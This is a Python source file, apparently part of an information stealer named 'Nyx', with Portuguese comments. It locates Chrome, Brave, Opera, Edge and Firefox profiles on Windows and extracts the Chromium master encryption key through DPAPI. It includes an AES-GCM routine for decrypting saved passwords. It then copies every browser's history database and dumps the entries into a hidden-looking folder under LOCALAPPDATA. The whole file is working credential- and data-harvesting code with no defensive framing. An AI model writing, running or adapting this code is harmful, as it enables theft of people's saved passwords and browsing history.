import os
import shutil
import sqlite3
import base64
import json
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from datetime import datetime, timedelta


class BrowserDataExtractor:
    def __init__(self, browser_name: str):
        self.browser_name = browser_name
        self.browser_path = self.get_browser_path()

    def get_browser_path(self) -> str:
        paths = {
            "chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
            "brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
            "opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
            "edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
            "firefox": os.path.expanduser("~") + r"\AppData\Roaming\Mozilla\Firefox\Profiles"
        }
        return paths.get(self.browser_name.lower(), "")

    def get_encryption_key(self) -> bytes:
        try:
            if self.browser_name == "firefox":
                return None

            local_state_path = os.path.join(self.browser_path, "Local State")

            with open(local_state_path, 'r', encoding='utf-8') as file:
                local_state_data = json.load(file)

            encrypted_key = local_state_data["os_crypt"]["encrypted_key"]

            encrypted_key = base64.b64decode(encrypted_key)[5:]

            decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

            return decrypted_key
        except Exception as e:
            print(f"Erro ao obter a chave de criptografia: {e}")
            return None

    def decrypt_password(self, encrypted_password: bytes, key: bytes) -> str:
        try:
            iv = encrypted_password[3:15]
            encrypted_password = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
            return decrypted_password
        except Exception as e:
            print(f"Erro ao descriptografar: {e}")
            return ""

    def get_chromium_history(self) -> list[tuple[str, str, str]]:
        history_file_paths = list()

        for root, _, files in os.walk(self.browser_path):
            for file in files:
                if file.lower() == "history":
                    filepath = os.path.join(root, file)
                    history_file_paths.append(filepath)

        history_entries = []

        for path in history_file_paths:
            while True:
                tempfile = os.path.join(
                    os.getenv("TEMP"), self.get_random_string(10) + ".tmp"
                )
                if not os.path.isfile(tempfile):
                    break

            try:
                shutil.copy(path, tempfile)
            except Exception as e:
                print(f"Erro ao copiar arquivo de histórico: {e}")
                continue

            db = sqlite3.connect(tempfile)
            cursor = db.cursor()

            try:
                # Inclui a data de acesso pra ordenar pelo recente
                results = cursor.execute(
                    "SELECT url, title, last_visit_time FROM urls"
                ).fetchall()

                for url, title, last_visit_time in results:
                    # converte o tempo para legibilidade
                    last_visit_time = self.chromium_time_to_datetime(last_visit_time)
                    if url and title and last_visit_time:
                        history_entries.append((url, title, last_visit_time))

                # ordenar, lambda é uma merda.
                history_entries.sort(key=lambda x: x[2], reverse=True)

            except Exception as e:
                print(f"Erro ao consultar banco de dados: {e}")

            cursor.close()
            db.close()
            os.remove(tempfile)

        return history_entries

    def get_firefox_history(self) -> list[tuple[str, str, str]]:
        history_entries = []

        for profile in os.listdir(self.browser_path):
            profile_path = os.path.join(self.browser_path, profile)

            if os.path.isdir(profile_path):
                places_db_path = os.path.join(profile_path, "places.sqlite")
                if os.path.exists(places_db_path):
                    while True:
                        tempfile = os.path.join(
                            os.getenv("TEMP"), self.get_random_string(10) + ".tmp"
                        )
                        if not os.path.isfile(tempfile):
                            break

                    try:
                        shutil.copy(places_db_path, tempfile)
                    except Exception as e:
                        print(f"Erro ao copiar arquivo de histórico: {e}")
                        continue

                    db = sqlite3.connect(tempfile)
                    cursor = db.cursor()

                    try:
                        results = cursor.execute(
                            "SELECT url, title, last_visit_date FROM moz_places"
                        ).fetchall()

                        for url, title, last_visit_date in results:
                            last_visit_date = self.firefox_time_to_datetime(last_visit_date)
                            if url and title and last_visit_date:
                                history_entries.append((url, title, last_visit_date))

                        history_entries.sort(key=lambda x: x[2], reverse=True)

                    except Exception as e:
                        print(f"Erro ao consultar banco de dados: {e}")

                    cursor.close()
                    db.close()
                    os.remove(tempfile)

        return history_entries

    def chromium_time_to_datetime(self, timestamp: int) -> datetime:
        """Converte o timestamp do Chromium (em microssegundos desde 1601-01-01) para datetime."""
        return datetime(1601, 1, 1) + timedelta(microseconds=timestamp)

    def firefox_time_to_datetime(self, timestamp: int) -> datetime:
        """Converte o timestamp do Firefox (em microssegundos desde 1970-01-01) para datetime."""
        return datetime(1970, 1, 1) + timedelta(microseconds=timestamp)

    def get_random_string(self, length: int) -> str:
        return base64.urlsafe_b64encode(os.urandom(length)).decode()[:length]

    def save_history_to_file(self, history: list[tuple[str, str, str]], file_path: str) -> None:
        try:
            with open(file_path, 'w', encoding='utf-8') as file:
                for url, title, date in history:
                    file.write(f"URL: {url}\nTitle: {title}\nDate: {date.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            print(f"Histórico salvo em: {file_path}")
        except Exception as e:
            print(f"Erro ao salvar histórico em arquivo: {e}")

    def get_history(self) -> list[tuple[str, str, str]]:
        if self.browser_name in ["chrome", "brave", "opera", "edge"]:
            return self.get_chromium_history()
        elif self.browser_name == "firefox":
            return self.get_firefox_history()
        else:
            print(f"Navegador {self.browser_name} não suportado.")
            return []


if __name__ == "__main__":
    browsers = ["chrome", "brave", "opera", "edge", "firefox"]

    for browser in browsers:
        extractor = BrowserDataExtractor(browser)
        history = extractor.get_history()

        if history:
            nyx_path = os.path.join(os.getenv("LOCALAPPDATA"), "Nyx")
            if not os.path.exists(nyx_path):
                os.makedirs(nyx_path)

            history_file_path = os.path.join(nyx_path, f"{browser}_history.txt")
            extractor.save_history_to_file(history, history_file_path)
        else:
            print(f"Nenhum histórico encontrado para {browser}.")
